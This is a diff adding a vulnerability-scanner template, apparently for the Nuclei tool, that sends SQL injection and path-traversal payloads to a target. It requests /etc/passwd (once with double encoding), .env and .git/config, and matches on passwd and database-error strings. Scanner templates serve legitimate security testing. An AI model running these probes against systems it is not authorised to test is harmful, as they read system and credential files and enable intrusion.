@@ -1,0 +1,32 @@
+id: nawab-sqli-lfi-found
+
+info:
+  name: 💀 Nawab-SQLi-LFI-Scanner 💀
+  author: thenawabx
+  severity: critical
+  description: Detects LFI and SQL Injection with absolute confirmation.
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1%27%20UNION%20SELECT%20null,CONCAT(0x726f6f74),null--"
+      - "{{BaseURL}}?file=../../../../etc/passwd"
+      - "{{BaseURL}}?path=..%252f..%252f..%252fetc/passwd"
+      - "{{BaseURL}}/.env"
+      - "{{BaseURL}}/.git/config"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        name: "!!! [FOUND] SERVER-CRACKED: LFI-DETECTED !!!"
+        regex:
+          - "root:x:0:0"
+        part: body
+
+      - type: regex
+        name: "!!! [FOUND] SQLi-CONFIRMED: DATABASE-ERROR !!!"
+        regex:
+          - "SQL syntax.*MySQL"
+          - "PostgreSQL.*ERROR"
+          - "Warning.*mysqli_fetch"
+        part: body
